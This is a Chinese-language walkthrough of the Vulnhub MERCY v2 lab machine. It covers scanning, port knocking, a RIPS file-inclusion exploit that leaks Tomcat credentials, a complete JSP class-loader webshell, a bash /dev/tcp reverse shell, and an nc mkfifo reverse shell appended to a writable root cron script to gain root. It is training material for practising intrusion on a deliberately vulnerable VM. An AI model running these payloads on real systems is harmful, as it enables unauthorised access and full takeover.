---
title: Vulnhub-DIGITALWORLD.LOCAL: MERCY V2
date: 2024-03-25  
categories: [Training platform,Vulnhub]  
tags: [Vulnhub,web]  
permalink: "/Vulnhub/MercyV2.html"
---

# DIGITALWORLD.LOCAL: MERCY V2

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403251401760.png" alt="image-20240324122938725" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403251401763.png" alt="image-20240325120829697" style="zoom: 50%;" />

## 信息搜集

### 端口扫描

扫描一下端口：

```bash
sudo nmap -sS 192.168.37.132
```

```apl
PORT     STATE    SERVICE
22/tcp   filtered ssh
53/tcp   open     domain
80/tcp   filtered http
110/tcp  open     pop3
139/tcp  open     netbios-ssn
143/tcp  open     imap
445/tcp  open     microsoft-ds
993/tcp  open     imaps
995/tcp  open     pop3s
8080/tcp open     http-proxy
MAC Address: 00:0C:29:73:16:69 (VMware)
```

```bash
nmap -sCV 192.168.37.132
```

```text
PORT     STATE SERVICE     VERSION
53/tcp   open  domain      ISC BIND 9.9.5-3ubuntu0.17 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.9.5-3ubuntu0.17-Ubuntu
110/tcp  open  pop3?
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-08-24T13:22:55
|_Not valid after:  2028-08-23T13:22:55
|_ssl-date: TLS randomness does not represent time
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp  open  imap        Dovecot imapd
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-08-24T13:22:55
|_Not valid after:  2028-08-23T13:22:55
|_ssl-date: TLS randomness does not represent time
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
993/tcp  open  ssl/imap    Dovecot imapd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-08-24T13:22:55
|_Not valid after:  2028-08-23T13:22:55
995/tcp  open  ssl/pop3s?
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-08-24T13:22:55
|_Not valid after:  2028-08-23T13:22:55
|_ssl-date: TLS randomness does not represent time
8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
| http-robots.txt: 1 disallowed entry 
|_/tryharder/tryharder
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-server-header: Apache-Coyote/1.1
Service Info: Host: MERCY; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2024-03-25T04:12:55
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: MERCY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: mercy
|   NetBIOS computer name: MERCY\x00
|   Domain name: \x00
|   FQDN: mercy
|_  System time: 2024-03-25T12:12:55+08:00
|_clock-skew: mean: -2h39m59s, deviation: 4h37m07s, median: 0s
```

### 目录扫描

```
feroxbuster -u http://192.168.37.132
```

> => error sending request for url (http://192.168.37.132/): error trying to connect: tcp connect error: Connection refused (os error 111)                                                           ERROR: Could not connect to any target provided 
>
> 表示被过滤了，nmap扫描结果为`filtered`

```bash
feroxbuster -u http://192.168.37.132:8080
```

```text
404      GET        1l       46w      989c http://192.168.37.132:8080/tryharder/
200      GET        1l        1w      621c http://192.168.37.132:8080/tryharder/tryharder
404      GET        1l       46w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        0l        0w        0c http://192.168.37.132:8080/docs => http://192.168.37.132:8080/docs/
302      GET        0l        0w        0c http://192.168.37.132:8080/manager => http://192.168.37.132:8080/manager/
302      GET        0l        0w        0c http://192.168.37.132:8080/examples => http://192.168.37.132:8080/examples/
302      GET        0l        0w        0c http://192.168.37.132:8080/docs/images => http://192.168.37.132:8080/docs/images/
401      GET       64l      289w     2474c http://192.168.37.132:8080/manager/html
302      GET        0l        0w        0c http://192.168.37.132:8080/docs/config => http://192.168.37.132:8080/docs/config/
302      GET        0l        0w        0c http://192.168.37.132:8080/docs/api => http://192.168.37.132:8080/docs/api/
302      GET        0l        0w        0c http://192.168.37.132:8080/examples/jsp => http://192.168.37.132:8080/examples/jsp/
302      GET        0l        0w        0c http://192.168.37.132:8080/examples/jsp/include => http://192.168.37.132:8080/examples/jsp/include/
302      GET        0l        0w        0c http://192.168.37.132:8080/examples/jsp/error => http://192.168.37.132:8080/examples/jsp/error/
302      GET        0l        0w        0c http://192.168.37.132:8080/examples/jsp/images => http://192.168.37.132:8080/examples/jsp/images/
302      GET        0l        0w        0c http://192.168.37.132:8080/examples/jsp/xml => http://192.168.37.132:8080/examples/jsp/xml/
302      GET        0l        0w        0c http://192.168.37.132:8080/examples/jsp/chat => http://192.168.37.132:8080/examples/jsp/chat/
[>-------------------] - 3s      6511/390008  3m      found:15      errors:0      
302      GET        0l        0w        0c http://192.168.37.132:8080/examples/servlets => http://192.168.37.132:8080/examples/servlets/
302      GET        0l        0w        0c http://192.168.37.132:8080/examples/jsp/plugin => http://192.168.37.132:8080/examples/jsp/plugin/
302      GET        0l        0w        0c http://192.168.37.132:8080/examples/jsp/forward => http://192.168.37.132:8080/examples/jsp/forward/
302      GET        0l        0w        0c http://192.168.37.132:8080/examples/servlets/images => http://192.168.37.132:8080/examples/servlets/images/
302      GET        0l        0w        0c http://192.168.37.132:8080/examples/jsp/security => http://192.168.37.132:8080/examples/jsp/security/
302      GET        0l        0w        0c http://192.168.37.132:8080/examples/jsp/sessions => http://192.168.37.132:8080/examples/jsp/sessions/
302      GET        0l        0w        0c http://192.168.37.132:8080/host-manager/ => http://192.168.37.132:8080/host-manager/html
401      GET       54l      241w     2044c http://192.168.37.132:8080/host-manager/html
302      GET        0l        0w        0c http://192.168.37.132:8080/manager/ => http://192.168.37.132:8080/manager/html
200      GET       29l      211w     1895c http://192.168.37.132:8080/
404      GET       46l      184w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        0l        0w        0c http://192.168.37.132:8080/examples/jsp/cal => http://192.168.37.132:8080/examples/jsp/cal/
302      GET        0l        0w        0c http://192.168.37.132:8080/manager/images => http://192.168.37.132:8080/manager/images/
401      GET       64l      289w     2474c http://192.168.37.132:8080/manager/text/
401      GET       64l      289w     2474c http://192.168.37.132:8080/manager/text/css
200      GET        5l       27w      288c http://192.168.37.132:8080/examples/jsp/chat/chat
401      GET       64l      289w     2474c http://192.168.37.132:8080/manager/text
401      GET       64l      289w     2474c http://192.168.37.132:8080/manager/status
302      GET        0l        0w        0c http://192.168.37.132:8080/examples/jsp/colors => http://192.168.37.132:8080/examples/jsp/colors/
404      GET        0l        0w        0c http://192.168.37.132:8080/manager/accounts
404      GET        0l        0w        0c http://192.168.37.132:8080/manager/unused
404      GET        0l        0w        0c http://192.168.37.132:8080/manager/tree
302      GET        0l        0w        0c http://192.168.37.132:8080/examples/jsp/plugin/applet => http://192.168.37.132:8080/examples/jsp/plugin/applet/
302      GET        0l        0w        0c http://192.168.37.132:8080/examples/jsp/async => http://192.168.37.132:8080/examples/jsp/async/
302      GET        0l        0w        0c http://192.168.37.132:8080/docs/architecture => http://192.168.37.132:8080/docs/architecture/
302      GET        0l        0w        0c http://192.168.37.132:8080/examples/jsp/dates => http://192.168.37.132:8080/examples/jsp/dates/
200      GET       10l       19w      221c http://192.168.37.132:8080/examples/jsp/j_security_check
200      GET       10l       19w      221c http://192.168.37.132:8080/examples/servlets/j_security_check
200      GET       10l       19w      221c http://192.168.37.132:8080/examples/j_security_check
200      GET       10l       19w      221c http://192.168.37.132:8080/examples/jsp/error/j_security_check
200      GET       10l       19w      221c http://192.168.37.132:8080/examples/jsp/images/j_security_check
200      GET       10l       19w      221c http://192.168.37.132:8080/examples/servlets/images/j_security_check
200      GET       10l       19w      221c http://192.168.37.132:8080/examples/jsp/plugin/j_security_check
200      GET       10l       19w      221c http://192.168.37.132:8080/examples/jsp/security/j_security_check
200      GET       10l       19w      221c http://192.168.37.132:8080/examples/jsp/xml/j_security_check
401      GET       64l      289w     2474c http://192.168.37.132:8080/manager/j_security_check
200      GET       10l       19w      221c http://192.168.37.132:8080/examples/jsp/forward/j_security_check
200      GET       10l       19w      221c http://192.168.37.132:8080/examples/jsp/include/j_security_check
200      GET       10l       19w      221c http://192.168.37.132:8080/examples/jsp/sessions/j_security_check
200      GET       10l       19w      221c http://192.168.37.132:8080/examples/jsp/cal/j_security_check
302      GET        0l        0w        0c http://192.168.37.132:8080/examples/jsp/chat/index.jsp;jsessionid=D8AF0618B91EF30D5FF0FD4BAFEB9293 => http://192.168.37.132:8080/examples/jsp/chat/login.jsp
200      GET       10l       19w      221c http://192.168.37.132:8080/examples/jsp/chat/j_security_check
401      GET       64l      289w     2474c http://192.168.37.132:8080/manager/images/j_security_check
200      GET       10l       19w      221c http://192.168.37.132:8080/examples/jsp/colors/j_security_check
404      GET        0l        0w        0c http://192.168.37.132:8080/manager/ris
200      GET       54l      198w     1689c http://192.168.37.132:8080/examples/jsp/async/index.jsp;jsessionid=0C7E29C0E0D37A8DB17EC652DB97EE01
200      GET       10l       19w      221c http://192.168.37.132:8080/examples/jsp/async/j_security_check
404      GET        0l        0w        0c http://192.168.37.132:8080/manager/images/TWiki
200      GET       10l       19w      221c http://192.168.37.132:8080/examples/jsp/dates/j_security_check
404      GET        0l        0w        0c http://192.168.37.132:8080/manager/images/how-to-order
404      GET        0l        0w        0c http://192.168.37.132:8080/manager/images/BTrivia
302      GET        0l        0w        0c http://192.168.37.132:8080/docs/architecture/startup => http://192.168.37.132:8080/docs/architecture/startup/
```

利用awk进行过滤一下：

```shell
awk '{print $1, $6}' temp
```

```text
404 http://192.168.37.132:8080/tryharder/
200 http://192.168.37.132:8080/tryharder/tryharder
302 http://192.168.37.132:8080/docs
302 http://192.168.37.132:8080/manager
302 http://192.168.37.132:8080/examples
302 http://192.168.37.132:8080/docs/images
401 http://192.168.37.132:8080/manager/html
302 http://192.168.37.132:8080/docs/config
302 http://192.168.37.132:8080/docs/api
302 http://192.168.37.132:8080/examples/jsp
302 http://192.168.37.132:8080/examples/jsp/include
302 http://192.168.37.132:8080/examples/jsp/error
302 http://192.168.37.132:8080/examples/jsp/images
302 http://192.168.37.132:8080/examples/jsp/xml
302 http://192.168.37.132:8080/examples/jsp/chat
302 http://192.168.37.132:8080/examples/servlets
302 http://192.168.37.132:8080/examples/jsp/plugin
302 http://192.168.37.132:8080/examples/jsp/forward
302 http://192.168.37.132:8080/examples/servlets/images
302 http://192.168.37.132:8080/examples/jsp/security
302 http://192.168.37.132:8080/examples/jsp/sessions
302 http://192.168.37.132:8080/host-manager/
401 http://192.168.37.132:8080/host-manager/html
302 http://192.168.37.132:8080/manager/
200 http://192.168.37.132:8080/
302 http://192.168.37.132:8080/examples/jsp/cal
302 http://192.168.37.132:8080/manager/images
401 http://192.168.37.132:8080/manager/text/
401 http://192.168.37.132:8080/manager/text/css
200 http://192.168.37.132:8080/examples/jsp/chat/chat
401 http://192.168.37.132:8080/manager/text
401 http://192.168.37.132:8080/manager/status
302 http://192.168.37.132:8080/examples/jsp/colors
404 http://192.168.37.132:8080/manager/accounts
404 http://192.168.37.132:8080/manager/unused
404 http://192.168.37.132:8080/manager/tree
302 http://192.168.37.132:8080/examples/jsp/plugin/applet
302 http://192.168.37.132:8080/examples/jsp/async
302 http://192.168.37.132:8080/docs/architecture
302 http://192.168.37.132:8080/examples/jsp/dates
200 http://192.168.37.132:8080/examples/jsp/j_security_check
200 http://192.168.37.132:8080/examples/servlets/j_security_check
200 http://192.168.37.132:8080/examples/j_security_check
200 http://192.168.37.132:8080/examples/jsp/error/j_security_check
200 http://192.168.37.132:8080/examples/jsp/images/j_security_check
200 http://192.168.37.132:8080/examples/servlets/images/j_security_check
200 http://192.168.37.132:8080/examples/jsp/plugin/j_security_check
200 http://192.168.37.132:8080/examples/jsp/security/j_security_check
200 http://192.168.37.132:8080/examples/jsp/xml/j_security_check
401 http://192.168.37.132:8080/manager/j_security_check
200 http://192.168.37.132:8080/examples/jsp/forward/j_security_check
200 http://192.168.37.132:8080/examples/jsp/include/j_security_check
200 http://192.168.37.132:8080/examples/jsp/sessions/j_security_check
200 http://192.168.37.132:8080/examples/jsp/cal/j_security_check
302 http://192.168.37.132:8080/examples/jsp/chat/index.jsp;jsessionid=D8AF0618B91EF30D5FF0FD4BAFEB9293
200 http://192.168.37.132:8080/examples/jsp/chat/j_security_check
401 http://192.168.37.132:8080/manager/images/j_security_check
200 http://192.168.37.132:8080/examples/jsp/colors/j_security_check
404 http://192.168.37.132:8080/manager/ris
200 http://192.168.37.132:8080/examples/jsp/async/index.jsp;jsessionid=0C7E29C0E0D37A8DB17EC652DB97EE01
200 http://192.168.37.132:8080/examples/jsp/async/j_security_check
404 http://192.168.37.132:8080/manager/images/TWiki
200 http://192.168.37.132:8080/examples/jsp/dates/j_security_check
404 http://192.168.37.132:8080/manager/images/how-to-order
404 http://192.168.37.132:8080/manager/images/BTrivia
302 http://192.168.37.132:8080/docs/architecture/startup
```

页面内容如下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403251401764.png" alt="image-20240325121824227" style="zoom:50%;" />

## 漏洞利用

### 敏感目录发掘

根据主页上的地址，尝试访问：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403251401766.png" alt="image-20240325123217162" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403251401767.png" alt="image-20240325123354703" style="zoom:50%;" />

![image-20240325123435438](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403251401768.png)

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403251401769.png" alt="image-20240325123449030" style="zoom:50%;" />

#### 漏洞信息搜集

发现`tomcat`版本`7.0.52`，尝试一下是否有相关漏洞：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403251401770.png" alt="image-20240325123630137" style="zoom:50%;" />

发现一个文件上传漏洞，可能等一下可以用到，先看看别的。

### 端口信息搜集

#### SMB服务收集

发现开启了`445`端口，尝试进行收集：

先拿`enum4linux`扫一下：

```bash
enum4Linux 192.168.37.132
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403251401771.png" alt="image-20240325124824854" style="zoom: 50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403251401772.png" alt="image-20240325124846078" style="zoom: 50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403251401773.png" alt="image-20240325125025195" style="zoom:50%;" />

发现了四个用户，一个共享文件

```apl
pleadformercy
qiu
thisisasuperduperlonguser
fluffy

qiu 
```

尝试连接上去看一下：

```bash
smbclient \\\\192.168.37.132\\qiu -U "qiu"
```

使用弱密码`password`登进去了：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403251401774.png" alt="image-20240325125949638" style="zoom: 50%;" />

查看一下下载的几个文件。

```bash
# configprint
#!/bin/bash

echo "Here are settings for your perusal." > config
echo "" >> config
echo "Port Knocking Daemon Configuration" >> config
echo "" >> config
cat "/etc/knockd.conf" >> config
echo "" >> config
echo "Apache2 Configuration" >> config
echo "" >> config
cat "/etc/apache2/apache2.conf" >> config
echo "" >> config
echo "Samba Configuration" >> config
echo "" >> config
cat "/etc/samba/smb.conf" >> config
echo "" >> config
echo "For other details of MERCY, please contact your system administrator." >> config

chown qiu:qiu config
```

发现包含了`config`文件，此文件太长我们寻找是否对我们有用的：

```text
Here are settings for your perusal.

Port Knocking Daemon Configuration

[options]
        UseSyslog

[openHTTP]
        sequence    = 159,27391,4
        seq_timeout = 100
        command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 80 -j ACCEPT
        tcpflags    = syn

[closeHTTP]
        sequence    = 4,27391,159
        seq_timeout = 100
        command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 80 -j ACCEPT
        tcpflags    = syn

[openSSH]
        sequence    = 17301,28504,9999
        seq_timeout = 100
        command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
        tcpflags    = syn

[closeSSH]
        sequence    = 9999,28504,17301
        seq_timeout = 100
        command     = /sbin/iptables -D iNPUT -s %IP% -p tcp --dport 22 -j ACCEPT
        tcpflags    = syn
```

看来这就是为啥我们上面扫描的时候被过滤了，需要`knock`进行开启！继续查看下载文件：

```text
# readme.txt
This is for your own eyes only. In case you forget the magic rules for remote administration.
```

尝试Knock一下端口：

```bash
knock 192.168.37.132 159 27391 4
knock 192.168.37.132 17301 28504 9999
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403251401775.png" alt="image-20240325130720144" style="zoom:33%;" />

发现开放了！

### 查看80端口信息

```text
This machine shall make you plead for mercy! Bwahahahahaha! 
```

扫描一下：

```
nmap -sCV -p 80 192.168.37.132
```

```apl
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.7 (Ubuntu)
| http-robots.txt: 2 disallowed entries 
|_/mercy /nomercy
```

发现存在两个目录`mercy`和`nomercy`：

```text
# http://192.168.37.132/mercy/index
Welcome to Mercy!

We hope you do not plead for mercy too much. If you do, please help us upgrade our website to allow our visitors to obtain more than just the local time of our system.
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403251401776.png" alt="image-20240325131406077" style="zoom:50%;" />

找了一下这个RIPS是个神魔东溪：

>  `RIPS - A static source code analyser for vulnerabilities in PHP scripts`
>
> RIPS is the most popular static code analysis tool to automatically detect vulnerabilities in PHP applications. By tokenizing and parsing all source code files, RIPS is able to transform PHP source code into a program model and to detect sensitive sinks (potentially vulnerable functions) that can be tainted by userinput (influenced by a malicious user) during the program flow. Besides the structured output of found vulnerabilities, RIPS offers an integrated code audit framework.
>
> `IPS-针对PHP脚本中漏洞的静态源代码分析器`
>
> RIPS是最流行的静态代码分析工具，用于自动检测PHP应用程序中的漏洞。通过标记化和解析所有源代码文件，RIPS能够将PHP源代码转换为程序模型，并检测在程序流期间可能被用户输入(受恶意用户影响)污染的敏感接收器(潜在易受攻击的函数)。除了结构化输出发现的漏洞外，RIPS还提供了一个集成的代码审计框架。

不管它是啥，它漏了版本，找一下是否存在漏洞：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403251401777.png" alt="image-20240325131802413" style="zoom:50%;" />

存在文件包含漏洞，阔以，下载下来看一下：

```bash
# RIPS <= 0.53 Multiple Local File Inclusion Vulnerabilities
# Google Dork: allintitle: "RIPS - A static source code analyser for
vulnerabilities in PHP scripts"
# Althout this script is not intended to be accesible from internet, there
are some websites that host it.
# Download: http://sourceforge.net/projects/rips-scanner/
# Date: 23/03/12
# Contact: mattdch0@gmail.com
# Follow: @mattdch
# www.localh0t.com.ar


File: /windows/code.php
=======================

102: file $lines = file($file);
    96: $file = $_GET['file'];

PoC:
http://localhost/rips/windows/code.php?file=../../../../../../etc/passwd

File: /windows/function.php
===========================

    64: file $lines = file($file);
        58: $file = $_GET['file'];

PoC:
http://localhost/rips/windows/function.php?file=../../../../../../etc/passwd(will
read the first line of the file) 
```

尝试一下这个`PoC`：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403251401778.png" alt="image-20240325132021802" style="zoom: 50%;" />

阔以！根据8080端口得到的提示，尝试是否可以包含`tomcat`的账号密码：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403251401779.png" alt="image-20240325132436756" style="zoom:50%;" />

```text
http://192.168.37.132/nomercy/windows/code.php?file=../../../../../../usr/local/tomcat/tomcat7/conf/tomcat-users.xml
http://192.168.37.132/nomercy/windows/code.php?file=../../../../../../home/qiu/.tomcat/conf/tomcat-users.xml
http://192.168.37.132/nomercy/windows/code.php?file=../../../../../../etc/tomcat7/tomcat-users.xml
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403251401781.png" alt="image-20240325133430764" style="zoom: 33%;" />

获得到了账号密码：

```apl
thisisasuperduperlonguser
heartbreakisinevitable

fluffy
freakishfluffybunny
```

### 登录上传shell

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403251401782.png" alt="image-20240325133535522" style="zoom:50%;" />

登录上来了以后，尝试上传`Jsp`木马：

```php
// exp.jsp => exp.war
<%!
    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }
        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }
 
    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception e) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }
%>
<%
    String cls = request.getParameter("hack");
    if (cls != null) {
        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
    }
%>
```

上传`exp.war`以后进行连接：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403251401783.png" alt="image-20240325133844681" style="zoom:50%;" />

蚁剑连接一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403251401784.png" alt="image-20240325134443051" style="zoom:33%;" />

反弹shell到kali上去：

```bash
# tomcat
bash -c 'exec bash -i &>/dev/tcp/10.161.181.188/1234 <&1'
```

```bash
# kali
nc -lvvp 1234
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403251401785.png" alt="image-20240325134653484" style="zoom:50%;" />

## 提权

### 切换至fluffy

刚才包含的时候有这个用户：

```apl
fluffy
freakishfluffybunny
```

尝试是否阔以进行切换：

```bash
tomcat7@MERCY:/var/lib/tomcat7$ su fluffy    
su fluffy
su: must be run from a terminal
```

扩展一下：

```bash
python -c "import pty;pty.spawn('/bin/bash')"
```

再次切换：

```bash
tomcat7@MERCY:/var/lib/tomcat7$ su fluffy
su fluffy
Password: freakishfluffybunny

Added user fluffy.

$ whoami;id
whoami;id
fluffy
uid=1003(fluffy) gid=1003(fluffy) groups=1003(fluffy)
```

### 信息搜集

#### 基础搜集

```bash
$ whoami;id
whoami;id
fluffy
uid=1003(fluffy) gid=1003(fluffy) groups=1003(fluffy)
$ python -c "import pty;pty.spawn('/bin/bash')"
python -c "import pty;pty.spawn('/bin/bash')"
fluffy@MERCY:/var/lib/tomcat7$ sudo -l
sudo -l
[sudo] password for fluffy: freakishfluffybunny

Sorry, user fluffy may not run sudo on MERCY.
fluffy@MERCY:/var/lib/tomcat7$ cat /etc/cron*
cat /etc/cron*
cat: /etc/cron.d: Is a directory
cat: /etc/cron.daily: Is a directory
cat: /etc/cron.hourly: Is a directory
cat: /etc/cron.monthly: Is a directory
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
cat: /etc/cron.weekly: Is a directory
fluffy@MERCY:/var/lib/tomcat7$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/sbin/pppd
/usr/sbin/uuidd
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/authbind/helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/landscape/apt-update
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/procmail
/usr/bin/chfn
/usr/bin/traceroute6.iputils
/usr/bin/lppasswd
/usr/bin/gpasswd
/usr/bin/at
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/mtr
/sbin/mount.cifs
/bin/umount
/bin/ping
/bin/mount
/bin/fusermount
/bin/ping6
/bin/su
```

#### 查看敏感目录

```bash
fluffy@MERCY:/var/lib/tomcat7$ cd /home/fluffy
cd /home/fluffy
fluffy@MERCY:~$ ls -la
ls -la
total 16
drwxr-x--- 3 fluffy fluffy 4096 Nov 20  2018 .
drwxr-xr-x 6 root   root   4096 Nov 20  2018 ..
-rw------- 1 fluffy fluffy   12 Nov 20  2018 .bash_history
drwxr-xr-x 3 fluffy fluffy 4096 Nov 20  2018 .private
fluffy@MERCY:~$ cd .private
cd .private
fluffy@MERCY:~/.private$ ls -la
ls -la
total 12
drwxr-xr-x 3 fluffy fluffy 4096 Nov 20  2018 .
drwxr-x--- 3 fluffy fluffy 4096 Nov 20  2018 ..
drwxr-xr-x 2 fluffy fluffy 4096 Nov 20  2018 secrets
fluffy@MERCY:~/.private$ cd secrets
cd secrets
fluffy@MERCY:~/.private/secrets$ ls -la
ls -la
total 20
drwxr-xr-x 2 fluffy fluffy 4096 Nov 20  2018 .
drwxr-xr-x 3 fluffy fluffy 4096 Nov 20  2018 ..
-rwxr-xr-x 1 fluffy fluffy   37 Nov 20  2018 backup.save
-rw-r--r-- 1 fluffy fluffy   12 Nov 20  2018 .secrets
-rwxrwxrwx 1 root   root    222 Nov 20  2018 timeclock
fluffy@MERCY:~/.private/secrets$ cat backup.save
cat backup.save
#!/bin/bash

echo Backing Up Files;

fluffy@MERCY:~/.private/secrets$ cat .secret
cat .secret
cat: .secret: No such file or directory
fluffy@MERCY:~/.private/secrets$ cat .secrets
cat .secrets
Try harder!
fluffy@MERCY:~/.private/secrets$ cat timeclock
cat timeclock
#!/bin/bash

now=$(date)
echo "The system time is: $now." > ../../../../../var/www/html/time
echo "Time check courtesy of LINUX" >> ../../../../../var/www/html/time
chown www-data:www-data ../../../../../var/www/html/time
```

发现突破口了！虽然这几个文件没啥好看的，但是最后一个文件可是root权限的，而且我们还可以进行编辑！尝试反弹一个shell到kali！

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.161.181.188 2345 >/tmp/f" >> timeclock
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403251401786.png" alt="image-20240325140037837" style="zoom:50%;" />

成功拿到root！！
